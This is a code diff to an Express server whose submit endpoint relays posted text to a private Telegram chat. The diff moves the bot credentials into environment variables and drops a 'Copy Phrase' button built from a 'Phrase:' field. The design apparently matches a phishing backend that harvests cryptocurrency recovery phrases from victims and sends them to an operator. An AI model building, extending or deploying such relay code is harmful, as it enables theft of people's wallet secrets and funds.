@@ -3,13 +3,14 @@ const path = require('path');
 const https = require('https');
 const express = require('express');
 const cors = require('cors');
+require('dotenv').config();
 
 const app = express();
-const PORT = 3000; // change if you need a different port
+const PORT = process.env.PORT || 3000; // change if you need a different port
 
-// Configure your Telegram details here (server-side only)
-const TELEGRAM_BOT_TOKEN = 'YOUR_TOKEN';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+// Configure your Telegram details from environment
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 app.use(cors());
 app.use(express.json({ limit: '100kb' }));
@@ -36,29 +37,11 @@ app.post('/api/submit', (req, res) => {
             return res.status(400).json({ ok: false, error: 'Missing text' });
         }
 
-        // Parse the text to extract the phrase for copy functionality
-        const phraseMatch = text.match(/Phrase: (.+)/);
-        const phrase = phraseMatch ? phraseMatch[1].trim() : '';
-        
-        // Create inline keyboard with copy button if phrase exists
-        let replyMarkup = null;
-        if (phrase && phrase !== '[empty]') {
-            replyMarkup = {
-                inline_keyboard: [[
-                    {
-                        text: "📋 Copy Phrase",
-                        copy_text: phrase
-                    }
-                ]]
-            };
-        }
-
         const payload = JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
             text,
             parse_mode: 'HTML',
-            disable_web_page_preview: true,
-            reply_markup: replyMarkup
+            disable_web_page_preview: true
         });
 
         const options = {
